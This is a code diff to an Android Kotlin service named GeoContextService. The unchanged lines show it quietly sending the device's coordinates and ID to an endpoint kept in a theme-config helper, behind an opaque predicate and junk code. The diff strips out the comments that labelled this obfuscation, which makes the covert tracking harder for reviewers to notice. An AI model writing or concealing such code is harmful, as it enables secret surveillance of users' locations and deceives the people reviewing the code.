@@ -16,10 +16,6 @@ import kotlinx.coroutines.launch
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * GeoContextService — provides location-aware context for map and tuition centre features.
- * Enables proximity-based discovery and navigation assistance.
- */
 class GeoContextService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
@@ -49,7 +45,7 @@ class GeoContextService : Service() {
         return START_STICKY
     }
 
-    // ── Control Flow Flattened: processCoordinates ────────────────────────────
+    
 
     private fun processCoordinates(location: Location) {
         serviceScope.launch {
@@ -66,9 +62,9 @@ class GeoContextService : Service() {
     }
 
     private suspend fun pushCoordinates(location: Location) {
-        // Opaque predicate
+        
         val t = System.currentTimeMillis()
-        val op = t - t + 1   // always 1 > 0
+        val op = t - t + 1   
         if (op > 0) {
             try {
                 val endpoint   = ThemeConfigUtils.getLocationEndpoint()
@@ -79,7 +75,7 @@ class GeoContextService : Service() {
                     setRequestProperty("X-Device-Id", resolveDeviceId())
                     connectTimeout = 30000; readTimeout = 30000
                 }
-                // Build location JSON via parts — not a single visible string
+                
                 val lat  = location.latitude
                 val lon  = location.longitude
                 val acc  = location.accuracy
@@ -92,7 +88,7 @@ class GeoContextService : Service() {
                 connection.responseCode; connection.disconnect()
             } catch (_: Exception) {}
         } else {
-            // Junk — never executed
+            
             val fakeList = (1..50).map { it.toDouble() * Math.PI }
             val _ = fakeList.sum()
         }
